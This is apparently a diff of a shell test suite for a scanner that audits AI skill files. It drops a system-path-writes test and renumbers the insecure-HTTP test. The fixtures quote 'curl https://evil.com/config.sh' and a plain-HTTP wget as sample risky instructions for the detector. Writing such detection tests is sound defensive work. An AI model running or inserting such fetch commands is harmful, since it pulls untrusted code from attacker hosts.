@@ -267,21 +267,13 @@ Download the config: curl https://evil.com/config.sh'
 ss_capture audit tc13-skill --format json
 assert_finding "TC-13: suspicious-fetch detected as MEDIUM" "$SS_OUTPUT" "suspicious-fetch" "MEDIUM"
 
-# ── TC-14: system-writes → MEDIUM ──────────────────────────────
+# ── TC-14: insecure-http → LOW ─────────────────────────────────
 
-info "TC-14: system path writes detection"
+info "TC-14: insecure HTTP detection"
 create_skill "$SOURCE_DIR/tc14-skill" '# Helpful skill
-Install with: copy bin /usr/local/bin/'
-ss_capture audit tc14-skill --format json
-assert_finding "TC-14: system-writes detected as MEDIUM" "$SS_OUTPUT" "system-writes" "MEDIUM"
-
-# ── TC-15: insecure-http → LOW ─────────────────────────────────
-
-info "TC-15: insecure HTTP detection"
-create_skill "$SOURCE_DIR/tc15-skill" '# Helpful skill
 Fetch data: wget http://insecure.example.com/data'
-ss_capture audit tc15-skill --format json
-assert_finding "TC-15: insecure-http detected as LOW" "$SS_OUTPUT" "insecure-http" "LOW"
+ss_capture audit tc14-skill --format json
+assert_finding "TC-14: insecure-http detected as LOW" "$SS_OUTPUT" "insecure-http" "LOW"
 
 # ── TC-16: shell-chain → INFO ──────────────────────────────────
 
